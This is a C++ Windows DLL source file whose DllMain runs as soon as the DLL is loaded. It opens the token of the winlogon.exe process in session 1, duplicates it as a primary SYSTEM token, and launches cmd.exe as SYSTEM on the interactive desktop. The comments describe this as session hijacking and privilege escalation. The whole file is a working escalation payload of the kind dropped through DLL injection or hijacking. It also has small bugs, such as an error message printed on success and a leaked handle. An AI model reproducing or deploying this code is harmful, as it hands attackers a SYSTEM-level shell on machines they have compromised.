#include "pch.h"
#include <Windows.h>
#include <WtsApi32.h>
#include <cstdio>
#pragma comment(lib, "WtsApi32.lib")
#include <TlHelp32.h>

BOOL StartCmdOnDefaultDesktop();
HANDLE GetSystemTokenFromWinlogon(DWORD sessionId);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
		StartCmdOnDefaultDesktop();
        break;
    case DLL_PROCESS_DETACH:
        // Perform cleanup if needed
        break;
    }
    return TRUE;
}

BOOL StartCmdOnDefaultDesktop()
{

	// This token to impersonate the active user, 
	// this is probably the same as session hijacking with creating service as INTERACTIVE USER.
	// We can use this without SE_TCB_NAME privilege so as local admin user process without running a service as SYSTEM.
	DWORD sessionId = 1; // Assuming Session 1 is the target session
	HANDLE hToken = NULL;
	if (!WTSQueryUserToken(sessionId, &hToken)) {
		printf("WTSQueryUserToken failed with error %d\n", GetLastError());
		return FALSE;
	}

	// This token to stay as NT AUTHORITY\SYSTEM
	// Get a SYSTEM user token and turn it into a primary token
	HANDLE hSystemToken = GetSystemTokenFromWinlogon(sessionId);
	if (hSystemToken == NULL) {
		return FALSE;
	}

	// But actually this token because we need a primary token i think
	// Remember we need SE_TCB_NAME privilege to create a primary token, which we only have as SYSTEM
	HANDLE hDupToken = NULL;
	if (!DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
		CloseHandle(hSystemToken);
		return FALSE;
	}

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	BOOL bResult = FALSE;
	TCHAR cmdLine[] = TEXT("cmd.exe");

	// Initialize the STARTUPINFO structure.
	// Specify that the process runs in the interactive desktop.
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	TCHAR desktop[] = TEXT("winsta0\\default");
	si.lpDesktop = desktop;

	// Launch the process in the Local System's context.
	bResult = CreateProcessAsUser(
		hDupToken,         // NOTICE THE TOKEN - Token need to be associated with the right session, and be a primary token. Alternative is setTokenInformation. 
		NULL,              // No module name (use command line)
		cmdLine,	       // Command line
		NULL,              // Process handle not inheritable
		NULL,              // Thread handle not inheritable
		FALSE,             // Set handle inheritance to FALSE
		0,                 // No creation flags
		NULL,              // Use parent's environment block
		NULL,              // Use parent's starting directory 
		&si,               // Pointer to STARTUPINFO structure
		&pi                // Pointer to PROCESS_INFORMATION structure
	);
	printf("after in CreateProcess\n");

	if (bResult && pi.hProcess != INVALID_HANDLE_VALUE)
	{
		printf("CreateProcess failed with error %d\n", GetLastError());
		CloseHandle(pi.hProcess);
	}

	if (pi.hThread != INVALID_HANDLE_VALUE)
		CloseHandle(pi.hThread);

	return bResult;
}

HANDLE GetSystemTokenFromWinlogon(DWORD sessionId) {
	HANDLE hToken = NULL;
	HANDLE hProcessSnap = NULL;
	HANDLE hProcess = NULL;
	PROCESSENTRY32 pe32 = { 0 };

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		return NULL;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Iterate through processes looking for winlogon in the target session.
	if (Process32First(hProcessSnap, &pe32)) {
		do {
			if (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0) {
				DWORD winlogonSessId = 0;
				if (ProcessIdToSessionId(pe32.th32ProcessID, &winlogonSessId) && winlogonSessId == sessionId) {
					hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
					if (hProcess != NULL) {
						if (OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
							CloseHandle(hProcess);
							break;
						}
						CloseHandle(hProcess);
					}
				}
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}

	CloseHandle(hProcessSnap);
	return hToken;
}